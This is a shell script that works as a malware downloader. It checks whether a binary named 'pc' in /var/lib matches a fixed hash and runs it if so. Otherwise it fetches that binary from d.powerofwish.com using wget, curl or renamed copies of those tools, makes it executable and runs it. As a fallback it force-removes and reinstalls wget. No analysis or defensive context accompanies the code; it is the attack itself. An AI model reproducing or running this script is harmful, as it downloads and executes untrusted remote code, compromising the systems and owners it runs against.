PATH=$PATH:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin

cd /var/lib


if [ -x "/usr/bin/md5sum" -o -x "/bin/md5sum" ];then
	sum=`md5sum pc|grep cce182c011c7e59fdf647acff931ecb2|grep -v grep |wc -l`
	if [ $sum -eq 1 ]; then
		chmod +x /var/lib/pc
		/var/lib/pc
		exit 0
	fi
fi

/bin/rm -rf /var/lib/pc
if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
   wget -c http://d.powerofwish.com/pc -O /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc
elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
   curl -fs http://d.powerofwish.com/pc -o /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc
elif [ -x "/usr/bin/wge"  -o  -x "/bin/get" ]; then
   get -c http://d.powerofwish.com/pc -O /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc
elif [ -x "/usr/bin/wge"  -o  -x "/bin/get" ]; then
   get -c http://d.powerofwish.com/pc -O /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc
elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
   cur -fs http://d.powerofwish.com/pc -o /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc
elif [ -x "/usr/bin/url"  -o  -x "/bin/url" ]; then
   url -fs http://d.powerofwish.com/pc -o /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc
else
   rpm -e --nodeps wget
   yum -y install wget
   wget -c http://d.powerofwish.com/pc -O /var/lib/pc && chmod +x /var/lib/pc && /var/lib/pc
fi
